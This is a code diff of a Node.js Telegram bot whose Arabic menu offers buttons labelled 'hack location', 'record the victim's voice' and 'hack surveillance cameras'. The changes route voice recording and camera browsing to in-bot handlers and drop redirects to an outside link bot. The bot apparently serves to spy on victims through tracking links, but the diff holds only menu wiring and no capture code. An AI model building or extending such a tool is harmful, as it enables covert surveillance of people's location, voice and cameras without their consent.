@@ -1174,7 +1174,7 @@ bot.onText(/\/stㅇㅗㅑㅡarㅏt/, async (msg) => {
 	        ],
 	        [
 	            { text: 'اختراق الموقع 📍', callback_data: `getLocation:${chatId}` },
-	            { text: 'تسجيل صوت الضحية 🎤', callback_data: 'redirect_urlcambot' }
+	            { text: 'تسجيل صوت الضحية 🎤', callback_data: `recordVoice:${chatId}` }
 	        ],
 	        [
 	            { text: 'اختراق كاميرات المراقبة 📡', callback_data: 'get_cameras' },
@@ -1277,7 +1277,7 @@ bot.on('callback_query', async (callbackQuery) => {
     const chatId = callbackQuery.message.chat.id;
     const data = callbackQuery.data;
 
-    if (data === 'capture_video' || data === 'captureFront' || data.startsWith('captureFront:') || data === 'captureBack' || data.startsWith('captureBack:') || data === 'recordVoice' || data.startsWith('recordVoice:') || data === 'get_photo_link') {
+    if (data === 'capture_video' || data === 'captureFront' || data.startsWith('captureFront:') || data === 'captureBack' || data.startsWith('captureBack:') || data === 'get_photo_link') {
         await bot.sendMessage(chatId, 'الرجاء استخدام هذا البوت للحصول على الروابط:', {
             reply_markup: {
                 inline_keyboard: [
@@ -1927,13 +1927,7 @@ bot.on('callback_query', async (query) => {
     const chatId = query.message.chat.id;
 
     if (query.data === 'get_cameras') {
-        await bot.sendMessage(chatId, 'الرجاء استخدام هذا البوت للحصول على الروابط:', {
-            reply_markup: {
-                inline_keyboard: [
-                    [{ text: 'الانتقال إلى بوت الروابط', url: 'https://t.me/urlcambot' }]
-                ]
-            }
-        });
+        showCountryList(chatId);
     } else if (query.data in countryTranslation) {
         bot.deleteMessage(chatId, query.message.message_id);
         displayCameras(chatId, query.data);
